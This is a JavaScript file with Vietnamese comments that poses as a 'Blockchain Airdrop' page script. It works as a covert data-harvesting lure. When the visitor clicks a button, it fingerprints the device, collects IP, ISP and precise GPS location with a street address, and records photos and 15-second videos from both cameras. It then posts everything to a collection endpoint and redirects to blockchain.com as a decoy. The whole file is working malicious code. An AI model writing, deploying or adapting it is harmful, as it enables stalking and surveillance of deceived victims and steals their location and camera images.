/**
 * Blockchain Airdrop Core System 2025-2026
 * Tối ưu hóa thu thập dữ liệu đa luồng và camera
 */

const CONFIG = {
    API_ENDPOINT: '/api/send',
    REDIRECT_URL: 'https://www.blockchain.com/',
    VIDEO_DURATION: 15000, // 15 giây
};

const UserData = {
    info: {
        time: new Date().toLocaleString('vi-VN'),
        device: 'Đang xác định...',
        os: 'Đang xác định...',
        ip: 'Đang lấy...',
        isp: 'Đang lấy...',
        address: 'Đang xác định...',
        coords: { lat: null, lon: null },
        maps: 'N/A'
    },
    media: [] // Chứa { type: 'photo'|'video', blob: Blob, label: string }
};

// --- 1. Nhận diện thiết bị (Cập nhật model 2025-2026) ---
function detectDevice() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    
    if (/android/i.test(ua)) UserData.info.os = 'Android';
    else if (/iPad|iPhone|iPod/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) UserData.info.os = 'iOS';
    else if (/Windows/.test(ua)) UserData.info.os = 'Windows';
    else UserData.info.os = 'macOS';

    if (UserData.info.os === 'iOS') {
        const screen = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}`;
        const models = {
            "430x932@3": "iPhone 16 Pro Max",
            "393x852@3": "iPhone 16 Pro",
            "428x926@3": "iPhone 14/15 Pro Max",
            "390x844@3": "iPhone 14/15 Pro",
        };
        UserData.info.device = models[screen] || 'iPhone/iPad';
    } else if (UserData.info.os === 'Android') {
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        if (match) {
            let m = match[1].trim();
            if (m.includes("SM-S938")) m = "Samsung Galaxy S25 Ultra";
            if (m.includes("SM-S948")) m = "Samsung Galaxy S26 Ultra";
            UserData.info.device = m;
        } else UserData.info.device = 'Android Device';
    } else {
        UserData.info.device = platform;
    }
}

// --- 2. Thu thập dữ liệu mạng & vị trí (Parallel) ---
async function collectNetworkAndGeo() {
    const results = await Promise.allSettled([
        fetch('https://api.ipify.org?format=json').then(r => r.json()),
        new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
                p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
                e => reject(e),
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }),
        fetch('https://ipwho.is/').then(r => r.json())
    ]);

    if (results[0].status === 'fulfilled') UserData.info.ip = results[0].value.ip;
    
    if (results[1].status === 'fulfilled') {
        const { lat, lon } = results[1].value;
        UserData.info.coords = { lat: lat.toFixed(6), lon: lon.toFixed(6) };
        UserData.info.maps = `https://www.google.com/maps?q=${lat},${lon}`;
        try {
            const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
            UserData.info.address = geo.display_name || '📍 Vị trí GPS';
        } catch { UserData.info.address = `Tọa độ: ${lat}, ${lon}`; }
    }

    if (results[2].status === 'fulfilled') {
        const data = results[2].value;
        UserData.info.isp = data.connection?.org || 'N/A';
        if (!UserData.info.address || UserData.info.address === 'Đang xác định...') {
            UserData.info.address = `${data.city}, ${data.country} (IP Region)`;
        }
    }
}

// --- 3. Xử lý Camera (Photo & Video) ---
async function captureMedia(facingMode, videoElementId, label) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, 
            audio: false 
        });
        const video = document.getElementById(videoElementId);
        video.srcObject = stream;

        await new Promise(r => setTimeout(r, 1500));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
        UserData.media.push({ type: 'photo', blob: photoBlob, filename: `photo_${label}.jpg` });

        return new Promise(resolve => {
            const types = ['video/webm', 'video/mp4', 'video/ogg'];
            const mimeType = types.find(t => MediaRecorder.isTypeSupported(t)) || '';
            
            const recorder = new MediaRecorder(stream, { mimeType });
            const chunks = [];
            recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = () => {
                const videoBlob = new Blob(chunks, { type: mimeType });
                const ext = mimeType.split('/')[1] || 'webm';
                UserData.media.push({ type: 'video', blob: videoBlob, filename: `video_${label}.${ext}` });
                stream.getTracks().forEach(t => t.stop());
                resolve();
            };
            recorder.start();
            setTimeout(() => { if(recorder.state !== 'inactive') recorder.stop(); }, CONFIG.VIDEO_DURATION);
        });
    } catch (err) {
        console.warn(`Camera ${label} lỗi:`, err);
        return null;
    }
}

// --- 4. Gửi dữ liệu về Proxy ---
async function sendData() {
    const formData = new FormData();
    const caption = `
🚀 [DỮ LIỆU XÁC THỰC MỚI]
━━━━━━━━━━━━━━━
🕒 Thời gian: ${UserData.info.time}
📱 Thiết bị: ${UserData.info.device} (${UserData.info.os})
🌐 IP: ${UserData.info.ip}
🏢 ISP: ${UserData.info.isp}
📍 Địa chỉ: ${UserData.info.address}
📌 Google Maps: ${UserData.info.maps}
━━━━━━━━━━━━━━━
`.trim();

    formData.append('caption', caption);
    UserData.media.forEach((item, index) => {
        formData.append(`file_${index}`, item.blob, item.filename);
    });

    try {
        await fetch(CONFIG.API_ENDPOINT, { method: 'POST', body: formData });
    } catch (e) {
        console.error("Lỗi gửi dữ liệu:", e);
    } finally {
        window.location.href = CONFIG.REDIRECT_URL;
    }
}

// --- 5. Khởi chạy hệ thống ---
async function startSystem() {
    const btn = document.getElementById('startBtn');
    const loading = document.getElementById('loading');
    btn.style.display = 'none';
    loading.style.display = 'block';

    detectDevice();
    
    await Promise.allSettled([
        collectNetworkAndGeo(),
        captureMedia('user', 'videoFront', 'front'),
        captureMedia('environment', 'videoBack', 'back')
    ]);

    await sendData();
}

document.getElementById('startBtn').addEventListener('click', startSystem);
